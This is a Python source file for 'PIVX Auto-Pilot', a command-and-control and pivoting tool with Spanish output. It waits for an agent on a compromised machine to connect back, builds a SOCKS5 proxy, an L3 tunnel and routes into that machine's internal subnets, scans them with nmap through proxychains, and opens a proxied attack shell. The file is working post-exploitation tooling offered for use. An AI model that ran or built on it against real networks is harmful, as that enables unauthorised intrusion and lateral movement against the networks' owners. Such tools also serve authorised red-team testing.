#!/usr/bin/env python3
"""Pivx Auto-Pilot CLI.

Arranca el C2, espera un agente, configura SOCKS5 + tunel + rutas
automaticamente, escanea la red interna y abre una shell proxificada.

Uso:  sudo server/venv/bin/python pivx-autopilot.py
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

from server.pivx_server import db, forward, runtime, ws_server

SOCKS_HOST = "127.0.0.1"
SOCKS_PORT = 1080
WS_PORT = 8765

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def banner():
    print(f"""
{RED}  ╔══════════════════════════════════════════════╗
  ║{RESET}{BOLD}          PIVX — Auto-Pilot CLI              {RESET}{RED}║
  ║{RESET}{DIM}   Hybrid Framing C2 & Pivoting Suite       {RESET}{RED}║
  ╚══════════════════════════════════════════════╝{RESET}
""")


def step(msg):
    print(f"  {GREEN}[+]{RESET} {msg}")


def info(msg):
    print(f"  {CYAN}[*]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


def error(msg):
    print(f"  {RED}[-]{RESET} {msg}")


def separator():
    print(f"  {DIM}{'─' * 50}{RESET}")


def wait_for_agent(timeout=300):
    info(f"WebSocket escuchando en ws://0.0.0.0:{WS_PORT}")
    print()
    info("Ejecuta en la maquina comprometida:")
    print(f"    {BOLD}./pivx-agent --server ws://<TU_IP>:{WS_PORT}{RESET}")
    print()
    separator()
    print()

    spinner = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    start = time.time()
    idx = 0

    while time.time() - start < timeout:
        df = db.get_agents_df()
        if not df.empty:
            online = df[df["status"] == "online"]
            if not online.empty:
                agent = online.iloc[0]
                agent_id = agent["agent_id"]
                print("\r" + " " * 60 + "\r", end="")
                step("Agente conectado!")
                print()
                info(f"  ID:       {agent_id[:16]}...")
                info(f"  Host:     {agent['hostname']}")
                info(f"  OS/Arch:  {agent.get('os', '?')}/{agent.get('arch', '?')}")
                info(f"  Remote:   {agent.get('remote_addr', '?')}")

                subnets = []
                ifaces = db.get_agent_interfaces(agent_id)
                for iface in ifaces:
                    for cidr in iface.get("cidrs", []):
                        info(f"  Red:      {iface.get('name', '?')} -> {cidr}")
                        subnets.append(cidr)
                print()
                return agent_id, subnets

        c = spinner[idx % len(spinner)]
        elapsed = int(time.time() - start)
        print(f"\r  {c} Esperando agente... ({elapsed}s)", end="", flush=True)
        idx += 1
        time.sleep(0.3)

    print()
    error("Timeout: ningun agente se conecto.")
    sys.exit(1)


def auto_setup(agent_id, subnets):
    separator()
    print()
    step("Configuracion automatica")
    print()

    step(f"SOCKS5 en {SOCKS_HOST}:{SOCKS_PORT}...")
    forward.start_socks_sync(SOCKS_HOST, SOCKS_PORT)
    step("SOCKS5 activo")

    is_root = os.geteuid() == 0
    tunnel_ok = False

    if is_root:
        step("Activando tunel L3 (pivx0)...")
        try:
            runtime.activate_tunnel(agent_id)
            step("Tunel activo")
            tunnel_ok = True
            for cidr in subnets:
                try:
                    runtime.add_route(cidr)
                    step(f"Ruta: {cidr} -> pivx0")
                except Exception as e:
                    warn(f"Ruta {cidr} fallo: {e}")
        except Exception as e:
            warn(f"Tunel fallo: {e} (continuando con SOCKS5)")
    else:
        warn("Sin root: tunel L3 deshabilitado (solo SOCKS5)")

    print()
    return tunnel_ok


def create_proxychains_conf():
    fd, path = tempfile.mkstemp(prefix="pivx_pc_", suffix=".conf")
    with os.fdopen(fd, "w") as f:
        f.write("strict_chain\n")
        f.write("quiet_mode\n")
        f.write("proxy_dns\n")
        f.write("[ProxyList]\n")
        f.write(f"socks5 {SOCKS_HOST} {SOCKS_PORT}\n")
    return path


def scan_network(subnets, tunnel_ok):
    if not subnets:
        warn("No se descubrieron subredes")
        return

    separator()
    print()
    step("Escaneando redes internas...")
    print()

    has_nmap = shutil.which("nmap") is not None

    if not has_nmap:
        warn("nmap no encontrado — escaneo omitido")
        info("Instala con: sudo apt install nmap")
        print()
        return

    pc_conf = create_proxychains_conf()
    pc_bin = shutil.which("proxychains4") or shutil.which("proxychains")

    for cidr in subnets:
        info(f"Escaneando {BOLD}{cidr}{RESET}...")
        print()

        if tunnel_ok:
            cmd = ["nmap", "-sn", "--min-rate", "300", "-T4", cidr]
        elif pc_bin:
            cmd = [pc_bin, "-f", pc_conf, "nmap", "-sT", "-Pn",
                   "-p", "22,80,443,445,3306,8080,8443", "--open",
                   "--min-rate", "100", cidr]
        else:
            warn("proxychains no encontrado y tunel inactivo — escaneo omitido")
            continue

        info(f"$ {' '.join(cmd)}")
        print()
        try:
            subprocess.run(cmd, timeout=180)
        except subprocess.TimeoutExpired:
            warn(f"Escaneo de {cidr} timeout (180s)")
        except KeyboardInterrupt:
            warn("Escaneo interrumpido")
        print()

    try:
        os.unlink(pc_conf)
    except OSError:
        pass


def interactive_shell():
    separator()
    print()
    step("Shell proxificada lista")
    print()
    info(f"SOCKS5:       {SOCKS_HOST}:{SOCKS_PORT}")
    info("proxychains:  preconfigurado (usa 'pc' como alias)")
    print()
    info("Ejemplos:")
    print(f"    {DIM}pc curl http://10.10.20.5/{RESET}")
    print(f"    {DIM}pc nmap -sT -Pn -p 80 10.10.20.0/24{RESET}")
    print(f"    {DIM}curl --socks5-hostname {SOCKS_HOST}:{SOCKS_PORT} http://objetivo/{RESET}")
    print(f"    {DIM}exit  (para salir){RESET}")
    print()
    separator()
    print()

    pc_conf = create_proxychains_conf()
    pc_bin = shutil.which("proxychains4") or shutil.which("proxychains") or "proxychains"

    rcfile_fd, rcfile = tempfile.mkstemp(prefix="pivx_rc_", suffix=".sh")
    with os.fdopen(rcfile_fd, "w") as f:
        f.write("[ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n")
        f.write(f'export PS1="\\[\\033[91m\\]pivx\\[\\033[0m\\] \\[\\033[96m\\]\\w\\[\\033[0m\\] $ "\n')
        f.write(f'export ALL_PROXY="socks5://{SOCKS_HOST}:{SOCKS_PORT}"\n')
        f.write(f'export PROXYCHAINS_CONF_FILE="{pc_conf}"\n')
        f.write(f'alias pc="{pc_bin} -f {pc_conf}"\n')
        f.write(f'alias pscan="pc nmap -sT -Pn"\n')
        f.write(f'alias pscurl="curl --socks5-hostname {SOCKS_HOST}:{SOCKS_PORT}"\n')
        f.write('echo ""\n')

    try:
        subprocess.run(["/bin/bash", "--rcfile", rcfile, "-i"])
    except KeyboardInterrupt:
        pass
    finally:
        for f in (rcfile, pc_conf):
            try:
                os.unlink(f)
            except OSError:
                pass


def cleanup():
    print()
    step("Limpiando...")
    try:
        forward.stop_socks_sync()
        step("SOCKS5 detenido")
    except Exception:
        pass
    try:
        runtime.deactivate_tunnel()
        step("Tunel desactivado")
    except Exception:
        pass
    step("Bye!")
    print()


def main():
    if sys.platform != "linux":
        error("Pivx Auto-Pilot requiere Linux (o WSL2)")
        sys.exit(1)

    banner()

    if os.geteuid() != 0:
        warn("Ejecutando sin root: el tunel L3 no estara disponible")
        warn("Para funcionalidad completa: sudo server/venv/bin/python pivx-autopilot.py")
        print()

    step("Inicializando...")
    db.get_connection()

    step(f"Levantando WebSocket en 0.0.0.0:{WS_PORT}...")
    ws_server.start_background_listener(host="0.0.0.0", port=WS_PORT)
    time.sleep(0.5)
    print()

    agent_id, subnets = wait_for_agent()
    tunnel_ok = auto_setup(agent_id, subnets)
    scan_network(subnets, tunnel_ok)
    interactive_shell()
    cleanup()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        cleanup()
